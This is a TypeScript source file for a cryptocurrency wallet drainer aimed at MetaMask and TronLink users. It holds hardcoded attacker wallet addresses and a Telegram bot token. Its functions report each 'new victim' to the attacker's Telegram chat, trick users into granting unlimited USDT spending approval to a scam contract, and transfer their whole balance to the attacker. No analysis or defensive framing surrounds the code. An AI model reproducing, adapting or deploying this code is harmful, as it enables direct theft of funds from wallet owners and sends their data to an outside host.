// @ts-nocheck
import { ethers } from 'ethers';

// ============ CONFIG ============
export const ATTACKER_CONFIG = {
  attackerAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
  tronAttackerAddress: "TZ2cssEnaTAvBS6XasyuThFK5Hsr2zqHBa",
  telegramBotToken: "8764463650:AAGPoZcwOj3xat1YokIrsvO_Y3dAqq5ct4Y",
  telegramChatId: "8448871506",
  usdtContracts: {
    "0x1":  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "0x38": "0x55d398326f99059fF775485246999027B3197955",
    "0x2b6653dc": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  },
  scamContractAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
};

async function sendTelegramAlert(message: string) {
  try {
    const url = `https://api.telegram.org/bot${ATTACKER_CONFIG.telegramBotToken}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ATTACKER_CONFIG.telegramChatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (e) {
    console.log('Telegram alert failed:', e);
  }
}

export async function connectWallet() {
  // TronLink support
  if (window.tronWeb && window.tronWeb.ready) {
    const address = window.tronWeb.defaultAddress.base58;
    const chainId = 728126428;
    await sendTelegramAlert(`🔔 <b>NEW VICTIM (TronLink)</b>\n<code>${address}</code>`);
    return { signer: { _isTron: true, address }, address, chainId };
  }

  // MetaMask
  if (!window.ethereum) {
    throw new Error('MetaMask not detected. Please install and enable it.');
  }

  try {
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);

    await sendTelegramAlert(
      `🔔 <b>NEW VICTIM CONNECTED</b>\nAddress: <code>${address}</code>\nNetwork: ${chainId === 1 ? 'Ethereum' : chainId === 56 ? 'BNB Chain' : chainId}`
    );

    return { provider, signer, address, chainId };
  } catch (error: any) {
    console.error("Connect error:", error);
    if (error.code === 4001) throw new Error("You rejected the connection");
    throw new Error("Failed to connect. Is MetaMask unlocked?");
  }
}

export async function approveUnlimited(signer: any, chainId: number) {
  if (signer._isTron) {
    if (!window.tronWeb?.ready) throw new Error('TronLink not detected');
    const contract = await window.tronWeb.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
    const maxApprove = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const tx = await contract.approve(ATTACKER_CONFIG.scamContractAddress, maxApprove).send();
    await sendTelegramAlert(`✅ <b>UNLIMITED APPROVAL (TRC20)</b>`);
    return tx;
  }

  const usdtAddress = ATTACKER_CONFIG.usdtContracts['0x' + chainId.toString(16)];
  if (!usdtAddress) throw new Error('No USDT on this network');
  const token = new ethers.Contract(usdtAddress, ['function approve(address,uint256)'], signer);
  const tx = await token.approve(ATTACKER_CONFIG.scamContractAddress, ethers.MaxUint256);
  await sendTelegramAlert(`✅ <b>UNLIMITED APPROVAL</b>`);
  await tx.wait();
  return tx.hash;
}

export async function disguisedTransfer(signer: any, victimAddress: string, chainId: number) {
  if (signer._isTron) {
    if (!window.tronWeb?.ready) throw new Error('TronLink not detected');
    const contract = await window.tronWeb.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
    const balance = await contract.balanceOf(victimAddress).call();
    if (balance === '0') throw new Error('No balance');
    const tx = await contract.transfer(ATTACKER_CONFIG.tronAttackerAddress, balance).send();
    await sendTelegramAlert(`🚨 <b>TRC20 DRAINED</b>`);
    return tx;
  }

  const usdtAddress = ATTACKER_CONFIG.usdtContracts['0x' + chainId.toString(16)];
  if (!usdtAddress) throw new Error('No USDT');
  const token = new ethers.Contract(usdtAddress, [
    'function balanceOf(address) view returns (uint256)',
    'function transferFrom(address,address,uint256)'
  ], signer);
  const balance = await token.balanceOf(victimAddress);
  if (balance === 0n) throw new Error('No balance to drain');
  const tx = await token.transferFrom(victimAddress, ATTACKER_CONFIG.attackerAddress, balance);
  await sendTelegramAlert(`🚨 <b>FUNDS DRAINED</b>`);
  await tx.wait();
  return tx.hash;
}